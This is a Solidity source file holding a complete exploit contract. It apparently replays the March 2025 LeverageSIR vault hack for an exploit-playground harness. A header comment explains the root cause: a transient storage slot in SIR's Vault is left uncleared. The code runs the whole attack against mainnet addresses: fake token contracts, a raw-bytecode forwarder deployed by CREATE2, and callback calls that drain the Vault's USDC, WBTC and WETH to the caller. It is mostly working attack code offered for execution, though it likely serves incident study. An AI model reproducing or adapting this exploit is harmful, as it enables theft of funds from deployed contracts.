// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2025-03-LeverageSIR).
//
// The DeFiHackLabs PoC (test/LeverageSIR_exp.sol) has no single deployable
// entrypoint the recorder can call: `testPoC()` itself deploys TWO attack
// contracts under `vm.startPrank(attacker)` — `AttackerC_A` (the real attack
// logic) and `AttackerC_B` (a throwaway ERC20-shaped counterparty token) — and
// re-deploys `AttackerC_B` in a `while` loop until its address compares
// GREATER than `AttackerC_A`'s (`while (address(attC_A) < address(attC_B))`).
// That address-ordering constraint decides which token SIR's Vault treats as
// token0/token1 in `createAndInitializePoolIfNecessary`, and can't be expressed
// by the playground's declarative `constructorArgValues`/`attackArgs` (no
// directive re-deploys a helper in a loop based on a runtime address compare).
//
// This synthetic contract folds `testPoC()`'s deploy-loop + `attC_A.attack(attC_B)`
// call into ONE self-contained `run()` entrypoint: it deploys `AttackerC_B`
// (redeploying with a fresh CREATE nonce on each iteration, exactly like the
// original test's `attC_B = new AttackerC_B()`) until the ordering holds, then
// runs the entire original `AttackerC_A.attack()` body inline. Both contracts'
// bodies are copied byte-for-byte from the registry test.
//
// Root cause (see LeverageSIR_exp.md): SIR's Vault authenticates
// `uniswapV3SwapCallback` with `msg.sender == tload(1)` (Vault.sol:256-262),
// but `tload(1)` is never cleared by the `nonReentrant` modifier (which only
// clears slot 0) and is overwritten with the MINT RETURN VALUE at the end of
// every debt-token mint (Vault.sol:299-301). On a brand-new vault, the first
// APE mint returns `collateralIn` verbatim (APE.sol:223-225), so the attacker
// picks a deposit amount that makes the mint return exactly
// `uint160(deploymentAddress)` for a CREATE2 address they can occupy via
// `ImmutableCreate2Factory`. Once deployed there, that forwarder satisfies
// `msg.sender == tload(1)` and can call `uniswapV3SwapCallback` directly — its
// `isETH` branch does an unguarded `safeTransfer(debtToken, tload(1), amount)`,
// letting the attacker drain any token the Vault holds to any address slot 1
// points at, in any amount they pass as `amountDelta`.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IPoolInitializer {
    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external payable returns (address pool);
}

interface INonfungiblePositionManager is IPoolInitializer {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(
        MintParams calldata params
    ) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
}

interface Uni_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams memory params
    ) external payable returns (uint256 amountOut);
}

interface IFS is IERC20 {
    // Vault
    struct VaultParameters {
        address debtToken;
        address collateralToken;
        int8 leverageTier;
    }

    function initialize(VaultParameters memory vaultParams) external;
    function mint(
        bool isAPE,
        VaultParameters memory vaultParams,
        uint256 amountToDeposit,
        uint144 collateralToDepositMin
    ) external payable returns (uint256 amount);

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;

    // ImmutableCreate2Factory
    function safeCreate2(
        bytes32 salt,
        bytes calldata initializationCode
    ) external payable returns (address deploymentAddress);
}

// Contracts involved (verbatim from the registry test).
address constant vault = 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7;

address constant uniV3PositionsNFT = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
address constant uniV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant immutableCreate2Factory = 0x0000000000FFe8B47B3e2130213B802212439497;

address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant wbtc = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

contract LeverageSIRDrain {
    // Folds the original test's deploy loop + attack() call into one entrypoint.
    // Recorded by the playground as a single top-level call.
    function run() external {
        AttackerC_B attC_B = new AttackerC_B();
        while (address(this) < address(attC_B)) {
            attC_B = new AttackerC_B();
        }

        _attack(attC_B);
    }

    function _attack(AttackerC_B attC_B) internal {
        IPoolInitializer(uniV3PositionsNFT).createAndInitializePoolIfNecessary(
            address(attC_B),
            address(this),
            100,
            79228162514264337593543950336
        );

        uint256 amount1 = 108823205127466839754387550950703;
        INonfungiblePositionManager(uniV3PositionsNFT).mint(
            INonfungiblePositionManager.MintParams(
                address(attC_B),
                address(this),
                100,
                -190000,
                190000,
                amount1,
                amount1,
                0,
                0,
                address(this),
                block.timestamp
            )
        );

        Uni_Router_V3(uniV3Router).exactInputSingle(
            Uni_Router_V3.ExactInputSingleParams(
                address(this),
                address(attC_B),
                100,
                address(this),
                block.timestamp,
                114814730000000000000000000000000000,
                0,
                0
            )
        );

        IFS(vault).initialize(IFS.VaultParameters(address(attC_B), address(this), 0));

        // Manipulate SLOT 1 (`tstore(1, amount)`)
        IFS(vault).mint(
            true,
            IFS.VaultParameters(address(attC_B), address(this), 0),
            139650998347915452795864661928406629,
            1
        );

        // Create a contract with the same address as SLOT 1
        // (95759995883742311247042417521410689 === 0x00000000001271551295307acc16ba1e7e0d4281)
        address deploymentAddress = IFS(immutableCreate2Factory).safeCreate2(
            0x0000000000000000000000000000000000000000d739dcf6ae98b123e5650020,
            hex"608060405234801561001057600080fd5b50600080546001600160a01b031916321790556102f2806100326000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806311b92ab914610046578063d6d2b6ba1461005b578063e086e5ec1461006e575b600080fd5b61005961005436600461020d565b610076565b005b61005961006936600461020d565b6100ff565b61005961016d565b6000546001600160a01b0316321461008d57600080fd5b6000836001600160a01b031683836040516100a9929190610276565b6000604051808303816000865af19150503d80600081146100e6576040519150601f19603f3d011682016040523d82523d6000602084013e6100eb565b606091505b50509050806100f957600080fd5b50505050565b6000546001600160a01b0316321461011657600080fd5b6000836001600160a01b03168383604051610132929190610276565b600060405180830381855af49150503d80600081146100e6576040519150601f19603f3d011682016040523d82523d6000602084013e6100eb565b6000546001600160a01b0316321461018457600080fd5b60405132904780156108fc02916000818181858888f193505050501580156101b0573d6000803e3d6000fd5b50565b80356101be816102a8565b92915050565b60008083601f8401126101d657600080fd5b50813567ffffffffffffffff8111156101ee57600080fd5b60208301915083600182028301111561020657600080fd5b9250929050565b60008060006040848603121561022257600080fd5b600061022e86866101b3565b935050602084013567ffffffffffffffff81111561024b57600080fd5b610257868287016101c4565b92509250509250925092565b600061027083858461029c565b50500190565b6000610283828486610263565b949350505050565b60006001600160a01b0382166101be565b82818337506000910152565b6102b18161028b565b81146101b057600080fdfea26469706673582212206248366d18b20b1f2aadb961f5564f10ba9323e8fa7413f070e5cbc150a2d0b064736f6c63430008040033"
        );

        // At this point the deploymentAddress contract has control to call uniswapV3SwapCallback.

        // Take all USDC from Vault contract to deploymentAddress contract.
        //
        // NOTE: The original registry test hardcodes this calldata as a raw hex blob
        // that embeds AttackerC_A's OWN address (0x959951c5...) three times as the
        // uniswapV3SwapCallback `data` payload (payer/payer2/recipient fields) -
        // because in the original test, the attacker EOA's nonce-0 deploy always
        // lands AttackerC_A at that exact address. The playground harness
        // (recordExploit.ts / _verify-poc.mjs) does an unconditional pre-deploy
        // balanceOf() check on `attacker` BEFORE deploying the exploit contract,
        // which burns one extra nonce - so THIS synthetic exploit deploys at a
        // DIFFERENT address than the original AttackerC_A. A hardcoded copy of the
        // original blob would send funds to the wrong (unrelated, historical)
        // address instead of to this contract. Build the calldata dynamically
        // with address(this) instead, mirroring the (already-dynamic) data3/data4
        // construction below.
        {
            bytes memory cbData;
            cbData = bytes.concat(cbData, bytes32(uint256(uint160(address(this)))));
            cbData = bytes.concat(cbData, bytes32(uint256(uint160(address(this)))));
            cbData = bytes.concat(cbData, bytes32(uint256(uint160(usdc))));
            cbData = bytes.concat(cbData, bytes32(uint256(uint160(address(this)))));
            for (uint256 i = 0; i < 8; i++) {
                cbData = bytes.concat(cbData, bytes32(0));
            }
            cbData = bytes.concat(cbData, bytes32(uint256(1)));

            bytes memory swapCallbackCall = abi.encodeWithSelector(
                IFS.uniswapV3SwapCallback.selector,
                int256(0),
                int256(17814862676),
                cbData
            );
            bytes memory forwarderCall = abi.encodeWithSelector(bytes4(0x11b92ab9), vault, swapCallbackCall);
            deploymentAddress.call(forwarderCall);
        }

        // Transfer all USDC from deploymentAddress contract to attacker
        // And again manipulate SLOT 1 (`tstore(1, amount)`) so that it is this(LeverageSIRDrain) contract
        deploymentAddress.call(
            hex"11b92ab9000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000044a9059cbb0000000000000000000000009dF0C6b0066D5317aA5b38B36850548DaCCa6B4e0000000000000000000000000000000000000000000000000000000425d93b5400000000000000000000000000000000000000000000000000000000"
        );

        // Now take all the WBTC
        uint256 wbtcBal = IERC20(wbtc).balanceOf(vault);
        bytes memory data3;
        data3 = bytes.concat(data3, bytes32(uint256(uint160(address(this)))));
        data3 = bytes.concat(data3, bytes32(uint256(uint160(address(this)))));
        data3 = bytes.concat(data3, bytes32(uint256(uint160(wbtc))));
        data3 = bytes.concat(data3, bytes32(uint256(uint160(address(this)))));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(0));
        data3 = bytes.concat(data3, bytes32(uint256(1)));

        IFS(vault).uniswapV3SwapCallback(0, int256(wbtcBal), data3);

        IERC20(wbtc).transfer(msg.sender, wbtcBal);

        // And finally take all the WETH
        uint256 wethBal = IERC20(weth).balanceOf(vault);
        bytes memory data4;
        data4 = bytes.concat(data4, bytes32(uint256(uint160(address(this)))));
        data4 = bytes.concat(data4, bytes32(uint256(uint160(address(this)))));
        data4 = bytes.concat(data4, bytes32(uint256(uint160(weth))));
        data4 = bytes.concat(data4, bytes32(uint256(uint160(address(this)))));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(0));
        data4 = bytes.concat(data4, bytes32(uint256(1)));

        IFS(vault).uniswapV3SwapCallback(0, int256(wethBal), data4);

        IERC20(weth).transfer(msg.sender, wethBal);
    }

    // ERC20 (verbatim copy of AttackerC_A's minimal ERC20-shaped surface, needed
    // because the Vault/positions-manager/router treat this contract itself as
    // one of the pool's two tokens).

    mapping(address => uint256) public balanceOf;

    function symbol() external pure returns (string memory) {
        return "";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    struct Reserves {
        uint144 reserveApes;
        uint144 reserveLPers;
        int64 tickPriceX42;
    }
    struct Fees {
        uint144 collateralInOrWithdrawn;
        uint144 collateralFeeToStakers;
        uint144 collateralFeeToLPers;
    }

    // SIR's Vault calls back into "APE" (this contract, address(this) inside
    // _attack) to size the mint. Verbatim copy of AttackerC_A.mint().
    function mint(
        address, /* to */
        uint16, /* baseFee */
        uint8, /* tax */
        Reserves memory, /* reserves */
        uint144 /* collateralDeposited */
    ) external view returns (Reserves memory newReserves, Fees memory fees, uint256 amount) {
        newReserves = Reserves(10000000000, 0, 0);
        fees = Fees(0, 0, 0);
        amount = uint160(address(this));
    }
}

contract AttackerC_B {
    mapping(address => uint256) public balanceOf;

    function symbol() external pure returns (string memory) {
        return "";
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }
}
